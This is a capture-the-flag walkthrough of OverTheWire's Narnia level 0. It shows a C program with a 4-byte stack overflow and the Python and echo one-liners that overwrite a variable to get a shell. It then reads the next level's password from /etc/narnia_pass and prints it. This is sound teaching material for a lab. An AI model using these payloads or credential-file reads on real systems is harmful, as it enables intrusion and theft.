```bash
┏━•  ~
┗  ssh narnia0@narnia.labs.overthewire.org -p 2226

This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

narnia0@narnia.labs.overthewire.org's password:
Linux narnia 4.18.12 x86_64 GNU/Linux
```
... SNIP BANNER ...

```bash
narnia0@narnia:~$ cat /narnia/narnia0.c
```
```c
/*                                                                                                                               /*
  This program is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }
    
    return 0;
}
```

We can quickly see our buffer overflow in the code. The input character buffer (`char buf[20];`) has a length of 20 bytes, while the scanf() allows for 24 bytes (`scanf("%24s",&buf);`) of input leaving us 4 bytes to overflow. 

Looking at the code we can see that val has been assigned the hexadecimal value 0x41414141 (`long val=0x41414141;`), which, when decoded to a string is `AAAA`. It looks like the program expects the user to enter 20 characters then 0xDEADBEEF.

Lets try running the program with 20 A's to see the output.
```bash
narnia0@narnia:/narnia$ ./narnia0                                                                                     Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAA
buf: AAAAAAAAAAAAAAAAAAAA
val: 0x41414100
WAY OFF!!!!
```

Now lets see what happens if we can change `val` to another value by adding 20 A's and 4 B's.
```bash
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAABBBB
buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
```
It works! We were able to modify `val`. Now lets try giving the program what it wants. 20 chars, and then 0xdeadbeef. So lets test with the correct payload (i.e. hexstring in reverse 0xefbeadde)

```bash
narnia0@narnia:~$ python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
```

###### NOTE: You may be wondering why deadbeef is written backwards ("\xef\xbe\xad\xde"). In x86 and x86-64 (and a variety of other hardware), multi-byte values such as addresses are stored in little-endian order, ie. "backwards" from the viewpoint of a person reading it.

Now that we have privilege escilation lets get the password for narnia1 from /etc/narnia_pass/narnia1.

```bash
narnia0@narnia:~$ (python -c 'print "A"*20 + "\xef\xbe\xad\xde"'; echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
efeidiedae       # password for narnia1
```

Alternatively, print the string, and copy & paste it to get the the narnia1 shell and grab the password from /etc/ manually.

```bash
narnia0@narnia:/narnia$ (echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\xaf';cat)
AAAAAAAAAAAAAAAAAAAAﾭޯ

narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAAﾭޯ 
buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
$ whoami
narnia1
$ cat /etc/narnia_pass/narnia1
efeidiedae
$
```